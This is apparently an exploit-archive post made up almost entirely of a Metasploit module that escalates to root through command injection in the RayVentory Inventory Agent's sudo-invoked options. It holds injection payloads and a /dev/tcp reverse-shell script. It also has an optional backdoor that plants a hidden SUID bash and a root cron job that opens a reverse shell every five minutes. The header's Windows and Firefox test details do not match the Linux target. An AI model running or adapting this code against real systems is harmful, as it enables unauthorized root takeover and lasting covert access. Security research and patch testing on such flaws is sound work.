@@ -1,0 +1,533 @@
+=============================================================================================================================================
+| # Title     : Raynet rvia Local Privilege Escalation via Command Injection                                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://raynet.de/                                                                                                          |
+=============================================================================================================================================
+
+[+] Summary    :  A command injection vulnerability in RayVentory Inventory Agent allows a local authenticated user with overly permissive sudo privileges to execute arbitrary commands as root. 
+                  The issue affects versions up to 12.6.4392.49 and stems from improper input validation combined with insecure sudo configurations
+
+[+] POC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Local::Linux
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'RayVentory Inventory Agent Privilege Escalation',
+        'Description' => %q{
+          This module exploits a command injection vulnerability in RayVentory Inventory Agent
+          versions 12.6.4392.49 and prior. The vulnerability exists in multiple options
+          (getconfig, upload, inventory, oracle) due to improper input validation.
+
+          Successful exploitation allows an attacker with sudo privileges to execute arbitrary
+          commands as root, leading to full system compromise.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Rafael José Núñez Gulías',
+          'Metasploit Module Author'
+        ],
+        'DisclosureDate' => '2025-02-18',
+        'References' => [
+          ['CVE', '2025-69600'],
+          ['URL', 'https://example.com/advisory']
+        ],
+        'Platform' => ['linux'],
+        'Arch' => [ARCH_X86, ARCH_X64],
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'Targets' => [['Automatic', {}]],
+        'DefaultTarget' => 0,
+        'Notes' => {
+          'Reliability' => [REPEATABLE_SESSION],
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
+        }
+      )
+    )
+
+    register_options([
+      OptString.new('RVIA_PATH', [true, 'Path to rvia binary', '/opt/rvia/rvia']),
+      OptString.new('RVIA_CONFIG', [true, 'Path to rvia config file', '/opt/rvia/rvia.cfg']),
+      OptEnum.new('EXPLOIT_METHOD', [true, 'Exploitation method to use', 'auto',
+        ['auto', 'getconfig', 'upload', 'inventory', 'oracle', 'configfile']]),
+      OptInt.new('LISTENER_PORT', [true, 'Port for config file download listener', 4444]),
+      OptBool.new('CLEANUP', [true, 'Clean up artifacts after exploitation', true]),
+      OptBool.new('BACKDOOR', [false, 'Install persistent backdoor', false])
+    ])
+
+    register_advanced_options([
+      OptString.new('WritableDir', [true, 'Writable directory for payload', '/tmp']),
+      OptString.new('PAYLOAD_PREFIX', [true, 'Payload filename prefix', '.rvia_priv_esc'])
+    ])
+  end
+
+  def check
+    print_status('Checking for vulnerable RayVentory installation...')
+
+    unless file?(datastore['RVIA_PATH'])
+      vprint_error("rvia binary not found at #{datastore['RVIA_PATH']}")
+      return CheckCode::Safe
+    end
+
+    version = get_rvia_version
+    unless version
+      print_error('Could not determine RayVentory version')
+      return CheckCode::Unknown
+    end
+
+    print_good("Found RayVentory version: #{version}")
+
+    begin
+      current_ver = Rex::Version.new(version)
+      vulnerable_ver = Rex::Version.new('12.6.4392.49')
+      
+      if current_ver <= vulnerable_ver
+        print_good("Version #{version} is vulnerable to CVE-2025-69600")
+
+        sudo_check = check_sudo_permissions
+        if sudo_check
+          return CheckCode::Vulnerable
+        else
+          print_warning('Vulnerable but no exploitable sudo permissions found')
+          return CheckCode::Appears
+        end
+      else
+        print_warning("Version #{version} is newer than vulnerable version")
+        return CheckCode::Safe
+      end
+    rescue => e
+      vprint_error("Version comparison failed: #{e.message}")
+      print_warning('Could not verify version, continuing with caution')
+      return CheckCode::Unknown
+    end
+  end
+
+  def exploit
+
+    unless file?(datastore['RVIA_PATH'])
+      fail_with(Failure::NotFound, "rvia binary not found at #{datastore['RVIA_PATH']}")
+    end
+
+    sudo_check_result = check_sudo_permissions
+    unless sudo_check_result
+      fail_with(Failure::NoAccess, 'No exploitable sudo permissions for rvia')
+    end
+
+    @payload_path = create_payload
+    unless @payload_path
+      fail_with(Failure::Unknown, 'Failed to create payload')
+    end
+
+    method = datastore['EXPLOIT_METHOD'].downcase
+    if method == 'auto'
+      method = select_best_method
+    end
+
+    print_status("Using exploitation method: #{method}")
+
+    @used_method = method
+
+    case method
+    when 'getconfig'
+      exploit_getconfig
+    when 'upload'
+      exploit_upload
+    when 'inventory'
+      exploit_inventory
+    when 'oracle'
+      exploit_oracle
+    when 'configfile'
+      exploit_configfile
+    else
+      fail_with(Failure::BadConfig, "Invalid exploitation method: #{method}")
+    end
+
+    print_status('Waiting for payload execution...')
+    wait_for_payload
+  end
+
+  def cleanup
+    super
+    cleanup_artifacts if datastore['CLEANUP']
+  end
+
+  private
+
+  def get_rvia_version
+
+    if command_exists?('dpkg')
+      output = cmd_exec('dpkg -l 2>/dev/null | grep rvia | awk \'{print $3}\' | head -1')
+      return output.strip unless output.empty?
+    end
+
+    output = cmd_exec("#{datastore['RVIA_PATH']} --version 2>/dev/null | head -n1")
+    version = output.scan(/\d+\.\d+\.\d+\.\d+/).first
+    return version if version
+
+    if file?(datastore['RVIA_PATH'])
+      output = cmd_exec("strings #{datastore['RVIA_PATH']} 2>/dev/null | grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' | head -1")
+      version = output.scan(/\d+\.\d+\.\d+\.\d+/).first
+      return version if version
+    end
+
+    nil
+  end
+
+  def check_sudo_permissions
+    print_status('Checking sudo permissions...')
+
+    unless command_exists?('sudo')
+      print_warning('sudo command not found')
+      return false
+    end
+
+    begin
+      sudo_output = cmd_exec('sudo -n -l 2>&1')
+    rescue => e
+      vprint_error("sudo check failed: #{e.message}")
+      return false
+    end
+
+    if sudo_output.include?('password is required')
+      print_warning('sudo requires password - trying interactive method')
+
+      sudo_output = cmd_exec('sudo -l 2>&1')
+    end
+
+    if sudo_output.include?('not allowed to run sudo') || 
+       sudo_output.include?('is not in the sudoers file')
+      print_error('User is not allowed to run sudo')
+      return false
+    end
+
+    unless sudo_output.include?('rvia')
+      vprint_warning('rvia not found in sudoers')
+      return false
+    end
+
+    exploitable_patterns = [
+      /rvia\s+\*/,
+      /rvia\s+getconfig/,
+      /rvia\s+upload/,
+      /rvia\s+inventory/,
+      /rvia\s+oracle/,
+      /\(root\)/,
+      /\(ALL\s*:\s*ALL\)/,
+      /\(ALL\)/
+    ]
+
+    found_pattern = false
+    exploitable_patterns.each do |pattern|
+      if sudo_output =~ pattern
+        print_good("Found exploitable pattern: #{pattern.source}")
+        found_pattern = true
+      end
+    end
+
+    if found_pattern
+      print_good('Sudo configuration appears exploitable')
+      return true
+    end
+
+    print_warning('No exploitable sudo patterns found')
+    false
+  end
+
+  def create_payload
+
+    prefix = datastore['PAYLOAD_PREFIX'].to_s
+    unless prefix.start_with?('.')
+      prefix = ".#{prefix}"
+    end
+
+    prefix.gsub!('..', '.')
+    
+    payload_name = "#{prefix}_#{Rex::Text.rand_text_alpha(8)}"
+    payload_path = File.join(datastore['WritableDir'], payload_name)
+
+    begin
+
+      if payload_instance.name == 'cmd/unix/reverse_bash'
+
+        lhost = datastore['LHOST'] || '127.0.0.1'
+        lport = datastore['LPORT'] || 4444
+        payload_data = "#!/bin/bash\nbash -i >& /dev/tcp/#{lhost}/#{lport} 0>&1"
+        write_file(payload_path, payload_data)
+        cmd_exec("chmod +x #{payload_path}")
+      else
+
+        payload_data = generate_payload_exe
+        write_file(payload_path, payload_data)
+      end
+
+      print_good("Payload created at: #{payload_path}")
+      register_file_for_cleanup(payload_path)
+
+      payload_path
+    rescue => e
+      print_error("Failed to create payload: #{e.message}")
+      nil
+    end
+  end
+
+  def select_best_method
+
+    sudo_output = cmd_exec('sudo -n -l 2>&1')
+    
+    methods_priority = ['getconfig', 'upload', 'inventory', 'oracle']
+    
+    methods_priority.each do |m|
+      return m if sudo_output.include?(m)
+    end
+
+    'getconfig'
+  end
+
+  def exploit_getconfig
+    print_status('Exploiting via getconfig option...')
+    cmd = "#{datastore['RVIA_PATH']} getconfig \\\";#{@payload_path};\\\""
+    vprint_status("Executing: #{cmd}")
+    cmd_exec("sudo #{cmd} 2>/dev/null")
+  end
+
+  def exploit_upload
+    print_status('Exploiting via upload option...')
+
+    results_dir = get_results_directory
+    unless directory?(results_dir)
+      cmd_exec("sudo mkdir -p #{results_dir} 2>/dev/null")
+    end
+    
+    dummy_file = "#{results_dir}/test_#{Rex::Text.rand_text_numeric(6)}.xml"
+    cmd_exec("sudo touch #{dummy_file} 2>/dev/null")
+    register_file_for_cleanup(dummy_file)
+
+    cmd = "#{datastore['RVIA_PATH']} upload \\\"\\\;#{@payload_path}\\\;\\#\\\""
+    vprint_status("Executing: #{cmd}")
+    cmd_exec("sudo #{cmd} 2>/dev/null")
+  end
+
+  def exploit_inventory
+    print_status('Exploiting via inventory option...')
+    cmd = "#{datastore['RVIA_PATH']} inventory \\\";#{@payload_path};\\\""
+    vprint_status("Executing: #{cmd}")
+    cmd_exec("sudo #{cmd} 2>/dev/null")
+  end
+
+  def exploit_oracle
+    print_status('Exploiting via oracle option...')
+
+    bin_dir = "#{datastore['WritableDir']}/bin_#{Rex::Text.rand_text_alpha(8)}"
+    cmd_exec("mkdir -p #{bin_dir}")
+    cmd_exec("ln -sf #{@payload_path} #{bin_dir}/java")
+    @bin_dir = bin_dir
+    register_dir_for_cleanup(bin_dir)
+
+    backup_config
+
+    malicious_config = "#{datastore['WritableDir']}/rvia_cfg_#{Rex::Text.rand_text_alpha(8)}"
+    write_file(malicious_config, "javaPaths=#{bin_dir}/")
+    cmd_exec("sudo cp #{malicious_config} #{datastore['RVIA_CONFIG']}")
+    @malicious_config = malicious_config
+    register_file_for_cleanup(malicious_config)
+
+    cmd = "#{datastore['RVIA_PATH']} oracle test"
+    vprint_status("Executing: #{cmd}")
+    cmd_exec("sudo #{cmd} 2>/dev/null")
+  end
+
+  def exploit_configfile
+    print_status('Exploiting via configuration file...')
+
+    backup_config
+
+    malicious_config = "#{datastore['WritableDir']}/rvia_cfg_#{Rex::Text.rand_text_alpha(8)}"
+    config_content = <<~EOF
+      configDownloadSource=http://127.0.0.1:#{datastore['LISTENER_PORT']}/malicious
+      schedule:command:#{@payload_path} * * * * *
+    EOF
+    write_file(malicious_config, config_content)
+    cmd_exec("sudo cp #{malicious_config} #{datastore['RVIA_CONFIG']}")
+    @malicious_config = malicious_config
+    register_file_for_cleanup(malicious_config)
+
+    start_listener
+
+    cmd = "#{datastore['RVIA_PATH']} getconfig"
+    vprint_status("Executing: #{cmd}")
+    cmd_exec("sudo #{cmd} 2>/dev/null &")
+  end
+
+  def get_results_directory
+
+    if file?(datastore['RVIA_CONFIG'])
+      config_content = read_file(datastore['RVIA_CONFIG'])
+      if config_content =~ /resultsDirectory\s*=\s*([^\s]+)/
+        return $1.strip
+      end
+    end
+
+    '/opt/rvia/results'
+  end
+
+  def backup_config
+    if file?(datastore['RVIA_CONFIG'])
+      @config_backup = "#{datastore['WritableDir']}/rvia_cfg_backup_#{Rex::Text.rand_text_alpha(8)}"
+      cmd_exec("sudo cp #{datastore['RVIA_CONFIG']} #{@config_backup}")
+      register_file_for_cleanup(@config_backup)
+    end
+  end
+
+  def start_listener
+    print_status("Starting config download listener on port #{datastore['LISTENER_PORT']}...")
+    
+    begin
+     
+      server = Rex::Socket::TcpServer.create(
+        'LocalHost' => '0.0.0.0',
+        'LocalPort' => datastore['LISTENER_PORT'],
+        'Timeout' => 10,
+        'Context' => { 'Msf' => framework, 'MsfExploit' => self }
+      )
+
+      @listener_thread = Rex::ThreadFactory.spawn('ConfigListener', false) do
+        begin
+          Timeout.timeout(10) do
+            client = server.accept
+            request = client.get_once
+            vprint_status("Received request: #{request.to_s.strip}") if request
+            
+            response = "HTTP/1.1 200 OK\r\n"
+            response += "Content-Type: text/plain\r\n"
+            response += "\r\n"
+            response += "malicious"
+            
+            client.put(response)
+            client.close
+          end
+        rescue Timeout::Error
+          vprint_status('Listener timeout - no connection received')
+        rescue => e
+          vprint_error("Listener error: #{e.message}")
+        ensure
+          server.close rescue nil
+        end
+      end
+    rescue => e
+      print_error("Failed to start listener: #{e.message}")
+    end
+  end
+
+  def wait_for_payload
+
+    max_attempts = 10
+    attempt = 0
+    sleep_time = 1
+    
+    while attempt < max_attempts
+      if is_root?
+        print_good('Successfully gained root privileges!')
+
+        if datastore['BACKDOOR']
+          install_backdoor
+        end
+        return true
+      end
+
+      if file?(@payload_path) && setuid?(@payload_path)
+        print_good('Payload has SUID bit set!')
+        cmd_exec(@payload_path)
+        return true
+      end
+      
+      sleep(sleep_time)
+      sleep_time = [sleep_time * 1.5, 10].min  # Exponential backoff
+      attempt += 1
+    end
+    
+    print_warning('Payload execution timeout - check session manually')
+    false
+  end
+
+  def cleanup_artifacts
+    print_status('Cleaning up artifacts...')
+
+    if @config_backup && file?(@config_backup)
+      if file?(datastore['RVIA_CONFIG'])
+        cmd_exec("sudo cp #{@config_backup} #{datastore['RVIA_CONFIG']} 2>/dev/null")
+        print_good('Restored original rvia configuration')
+      end
+    end
+
+    if @malicious_config && file?(@malicious_config)
+      file_rm(@malicious_config)
+    end
+
+    if @bin_dir && directory?(@bin_dir)
+      cmd_exec("rm -rf #{@bin_dir} 2>/dev/null")
+    end
+
+    if @listener_thread && @listener_thread.alive?
+      @listener_thread.kill
+      @listener_thread.join(2) rescue nil
+    end
+
+    results_dir = get_results_directory
+    if directory?(results_dir)
+      cmd_exec("find #{results_dir} -name 'test_*.xml' -type f -delete 2>/dev/null")
+    end
+  end
+
+  def install_backdoor
+    print_status('Installing persistent backdoor...')
+    
+    lhost = datastore['LHOST'] || '127.0.0.1'
+    lport = datastore['LPORT'] || 4444
+
+    backdoor_path = '/tmp/.hidden_bash'
+    backdoor_script = '/tmp/.backdoor.sh'
+    
+    script_content = <<~EOF
+      #!/bin/bash
+      cp /bin/bash #{backdoor_path}
+      chmod 4755 #{backdoor_path}
+      if ! grep -q "#{backdoor_path}" /etc/crontab; then
+        echo "*/5 * * * * root #{backdoor_path} -c 'bash -i >& /dev/tcp/#{lhost}/#{lport} 0>&1'" >> /etc/crontab
+      fi
+    EOF
+    
+    begin
+      write_file(backdoor_script, script_content)
+      cmd_exec("chmod +x #{backdoor_script}")
+      cmd_exec("sudo #{backdoor_script} 2>/dev/null")
+      
+      print_good("Backdoor installed: #{backdoor_path}")
+      print_good('Cron job added for reverse shell every 5 minutes')
+      
+      register_file_for_cleanup(backdoor_script)
+      register_file_for_cleanup(backdoor_path)
+    rescue => e
+      print_error("Failed to install backdoor: #{e.message}")
+    end
+  end
+end
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
